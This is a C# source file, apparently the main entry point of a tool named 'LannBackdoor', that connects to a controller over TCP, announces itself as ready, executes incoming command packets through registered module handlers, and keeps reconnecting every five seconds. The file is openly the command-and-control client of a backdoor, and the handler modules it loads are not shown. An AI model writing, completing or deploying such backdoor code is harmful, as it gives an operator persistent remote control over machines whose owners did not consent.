using System.Net.Sockets;
using System.Reflection;
using LannLogger;
using ModulesApi;
using Networking;
using Networking.Packets;
using Serilog.Core;
using SystemModule;
using Constants = LannConstants.Constants;

namespace LannBackdoor;

public static class LannBackdoor {
    private static readonly Logger Logger = LoggerFactory.CreateLogger("LannBackdoor");
    private static TCPClient _tcpClient = null!;

    public static async Task Main(string[] args) {
        Console.OutputEncoding = System.Text.Encoding.UTF8;
        
        if(Constants.DEBUG) Logger.Debug("Running {Mode} mode", "DEBUG");
        Logger.Information("Ohayou, ばか!");
        Logger.Information("Config:\n  - Debug: {Debug}\n  - Url: {URL}\n  - Port: {Port}",
            true,
            "127.0.0.1",
            2022);
        
        ModuleRegistry.LoadByAssembly(typeof(SystemModuleImpl).Assembly);
        _tcpClient = new TCPClient();

        _tcpClient.OnConnect += async (_, _) => {
            Logger.Information("Connected!");
            await _tcpClient.SendPacket(PacketType.Ready, new { });
        };

        _tcpClient.OnCommand += async (_, data) => {
            Packet packet = data.Packet;
            Logger.Debug("Packet received: {Module}/{Handler}: {Data}",
                packet.ModuleId,
                packet.HandlerId,
                packet.GetData<object>());

            ModuleInfo? module = ModuleRegistry.Get(packet.ModuleId);
            if (module == null) {
                Logger.Debug("Unknown module: {Id}", packet.ModuleId);
                return;
            }

            HandlerInfo? handler = module.GetHandler(packet.HandlerId);
            if (handler == null) {
                Logger.Debug("Unknown handler: {Module}/{Id}",
                    packet.ModuleId,
                    packet.HandlerId);
                return;
            }

            try {
                Type type = handler.GetDataType();
                await handler.Execute(_tcpClient, packet.GetData<object>(type));
            } catch (Exception e) {
                Logger.Error("Handler {Module}/{Handler} invocation failed: {Error}",
                    packet.ModuleId,
                    packet.HandlerId,
                    e.Message);
            }
        };

        await Connect();
    }
    
    private static async Task Connect() {
        try {
            await _tcpClient.Connect();
            await _tcpClient.StartHandlingPackets();
        } catch (SocketException) {
            Logger.Error("Failed to connect! Reconnecting in 5000 ms");
            await Task.Delay(5000);
            await Connect();
        }
    }
}